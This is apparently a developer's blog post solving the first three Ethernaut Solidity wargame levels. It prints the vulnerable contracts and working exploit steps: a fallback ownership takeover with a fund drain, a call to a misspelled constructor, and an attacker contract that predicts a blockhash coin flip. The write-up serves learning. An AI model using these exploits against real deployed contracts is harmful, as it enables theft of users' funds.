---
title: "Ethernaut: Fallback, Fallout and winning a random game by predicting the future!"
description: In the past few days I've been playing around with solidity and decided to try out the Ethernaut challenge. And will share my solutions and thought process here.
date: 2022-05-06T02:26:11.716Z
tags:
  - Blockchain
  - Ethereum
  - JavaScript
  - Web Development
  - Solidity
cover: /blog/ethernaut-fallback-fallout-and-winning-a-random-game-by-predicting-the-future/cover.webp
---

In the past few days I've been playing around with solidity and decided to try out the [Ethernaut challenge](https://ethernaut.openzeppelin.com/). And will share my solutions and thought process here.

> If you want to try the Ethernaut yourself, you should attempt the challenges before continuing reading.

In this posts we will work through the first 3 exercises. I will assume you already know the basics of solidity as well as how to call smart contract functions.

## 1st Challenge: Fallback.

The goal of the challenge is to claim ownership of this contract and drain it of its funds. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

The Intended way to claim ownership is to send eth to the contract by calling the `contribute()` function. But this function requires sending less than `0.001` eth per call. We would need to call the function 100 times in order to contribute just 1 eth. 

And to claim ownership we need to beat the original owner's 1000 eth. So 100,000 calls would be needed. That's not happening. 

But the contract authors were kind enough to add the `receive()` part. Note the absence of the `function` keyword. This means it is a fallback. And it is payable. 

If you send any value greater than 0 and you already have *some* contribution, you can claim ownership.

A fallback is the function that gets called by default if a non-existent function is called on the contract. Or if ether is sent directly to the contract. Perhaps the author of the contract wanted to cheat their way into recovering ownership if they where beaten. 

So, the way of attacking is quite straight forward:

1. Call `contribute()` once with a minimal amount of eth. This will allow you to call the fallback
2. Call the fallback with any amount of eth. This will make you the owner
3. Once you are the owner, call `withdraw()`.

`contract` is the reference to the deployed smart contract. The Ethernaut exposes a `contract` object which is a [Truffle contract abstraction](https://trufflesuite.com/docs/truffle/reference/contract-abstractions/). We can call the smart contracts methods from it.

The initial contribution may look like this.
```js
await contract.contribute({value: toWei("0.0001")})
```
Then send a transaction with some eth. This [will trigger the fallback](https://trufflesuite.com/docs/truffle/reference/contract-abstractions/#sending-ether-triggering-the-fallback-function)

```js
await contract.sendTransaction({value: toWei("0.0001")})
```
That should give me ownership. If so, then I can call the `withdraw()` function. And retrieve all the ether from the contract.


```js
await contract.withdraw()
```

When you complete the challenge, you should see this on the console.

![Screen Shot 2022-05-05 at 16.36.31.png](/blog/ethernaut-fallback-fallout-and-winning-a-random-game-by-predicting-the-future/3QHi0vLKy.webp align="left")

## 2nd Challenge: Fallout

The second challenge is not so obvious. You have to claim ownership of this contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

The thing to notice is the constructor function. It is a function misspelled "Fal1out". So we can just call it and gain ownership.

```js
await contract.Fal1out()
```

![Screen Shot 2022-05-05 at 16.52.03.png](/blog/ethernaut-fallback-fallout-and-winning-a-random-game-by-predicting-the-future/7SPOw8MVA.webp align="left")

## 3rd Challenge: Predicting the future of a Coin Flip

This is where things start ramping up a notch. You have to "use your psychic abilities" to win 10 consecutive times in a coin flipping game, given the following smart contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
Of course, we are not gonna solve this with psychic abilities!

>yet...

`blockvalue` is deterministic in as much as it depends only on the current block. We can write a new smart contract that performs the same computation as `flip()`, and sends the guess in the same transaction.

That way we can guarantee that both will be mined on the same block, thus the computed guess is guaranteed to be correct.

```solidity
contract CoinAttack {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public original = CoinFlip(0xACA861f3BaA80b5Eb213f308f2b87BC311AEdA56);

    constructor() public payable {}

    function iCantBelieveIGuessed (bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 answer = blockValue.div(FACTOR);

        bool side = answer == 1 ? true : false;

        // we can now "guess"
        if (side == _guess) {
            return original.flip(_guess);
        } else {
            return original.flip(!_guess);
        }
    }
}
```
Once it is deployed we can just call its `iCantBelieveIGuessed()` function and from there call `flip()` on the address of the contract we are attacking. 

We can check our progress with 

```js
await contract.consecutiveWins()
```
Then submit the instance:

![Screen Shot 2022-05-05 at 20.26.06.png](/blog/ethernaut-fallback-fallout-and-winning-a-random-game-by-predicting-the-future/BGD687pk8.webp align="left")

And we are done!


## Epilogue.

I am enjoying solidity and smart contracts way more than Next.js or even AWS to be honest. Both of which I still like a lot. But I think I will focus on the topic of smart contracts!

"Thinking in solidity" requires shifting how we think about execution of the programs we write. Kinda similar to how when learning `async/await` in javascript. 

As we saw in the third example, several *consecutive* events can happen on the same block. Thus, it is as if they happen at the same time, at least as far as the blockchain is concerned.

Hopefully you found this useful. I'll share more answers in future posts!

:D
